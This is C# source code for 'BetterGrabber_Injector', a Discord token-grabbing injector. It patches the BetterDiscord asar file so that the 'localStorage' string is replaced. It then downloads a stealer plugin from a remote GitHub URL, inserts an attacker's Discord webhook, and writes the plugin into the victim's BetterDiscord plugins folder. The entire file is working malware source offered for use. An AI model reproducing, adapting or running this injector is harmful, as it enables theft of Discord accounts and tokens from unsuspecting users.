using System;
using System.IO;
using System.Net;
using System.Text;

namespace BetterGrabber_Injector
{
    internal class Program
    {
        static string getPath(int i)
        {
            return new string[] { String.Format("{0}\\BetterDiscord\\data\\betterdiscord.asar", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)), String.Format("{0}\\BetterDiscord\\plugins\\HideMe.plugin.js", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) }[i];
        }

        static string getPlugin()
        {
            return new WebClient().DownloadString("https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/plugin/GOD/HideMe.plugin.js").Replace("%webhook%", "/api/webhooks/YourWebhookID/YourWebhookTOKEN"); //WebHook
        }

        ///////////////////////////////////////////////
        ///https://stackoverflow.com/a/5132938 ////////
        ///////////////////////////////////////////////
        public static int FindBytes(byte[] src, byte[] find)
        {
            int index = -1;
            int matchIndex = 0;
            for (int i = 0; i < src.Length; i++)
            {
                if (src[i] == find[matchIndex])
                {
                    if (matchIndex == (find.Length - 1))
                    {
                        index = i - matchIndex;
                        break;
                    }
                    matchIndex++;
                }
                else if (src[i] == find[0])
                    matchIndex = 1;
                else
                    matchIndex = 0;

            }
            return index;
        }


        public static byte[] ReplaceBytes(byte[] src, byte[] search, byte[] repl)
        {
            byte[] dst = null;
            byte[] temp = null;
            int index = FindBytes(src, search);
            while (index >= 0)
            {
                if (temp == null)
                    temp = src;
                else
                    temp = dst;

                dst = new byte[temp.Length - search.Length + repl.Length];

                Buffer.BlockCopy(temp, 0, dst, 0, index);
                Buffer.BlockCopy(repl, 0, dst, index, repl.Length);
                Buffer.BlockCopy(
                    temp,
                    index + search.Length,
                    dst,
                    index + repl.Length,
                    temp.Length - (index + search.Length));


                index = FindBytes(dst, search);
            }
            return dst;
        }
        ///////////////////////////////////////////////
        ///https://stackoverflow.com/a/5132938 ////////
        ///////////////////////////////////////////////

        static void fuckBD()
        {
            try
            {
                byte[] f = File.ReadAllBytes(getPath(0));
                byte[] r = ReplaceBytes(f, new byte[] { 0x22, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x53, 0x74, 0x6F, 0x72, 0x61, 0x67, 0x65, 0x22 }, new byte[] { 0x22, 0x48, 0x69, 0x64, 0x65, 0x61, 0x6B, 0x69, 0x41, 0x4C, 0x6D, 0x61, 0x6F, 0x22 });
                File.WriteAllBytes(getPath(0), r);
            }
            catch
            {
                //Already Injected I think
            }
            //For some reasons it stopped to work
            /*byte[] f = { 0x22, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x53, 0x74, 0x6F, 0x72, 0x61, 0x67, 0x65, 0x22 };
            Console.WriteLine(Encoding.UTF8.GetString(f));
            byte[] r = { 0x22, 0x48, 0x69, 0x64, 0x65, 0x61, 0x6B, 0x69, 0x41, 0x4C, 0x6D, 0x61, 0x6F, 0x22 };
            Console.WriteLine(Encoding.UTF8.GetString(r));
            byte[] fb = File.ReadAllBytes(getPath(0));
            int i, j, max = fb.Length - f.Length;
            for (int ii = 0; ii < 2; ii++)
            {
                for (i = 0; i <= max; i++)
                {
                    for (j = 0; j < f.Length; j++)
                        if (fb[i + j] != f[j] || j == f.Length) break;
                }
                if (i <= max)
                {
                    for (j = 0; j < f.Length; j++)
                        fb[i + j] = r[j];
                    File.WriteAllBytes(getPath(0), fb);
                    Console.WriteLine("OK" + i);
                }
            }*/
        }

        static void injectPlugin()
        {
            string plugin = getPlugin();
            File.WriteAllText(getPath(1), plugin);
        }

        static void Main(string[] args)
        {
            fuckBD();
            injectPlugin();
        }
    }
}
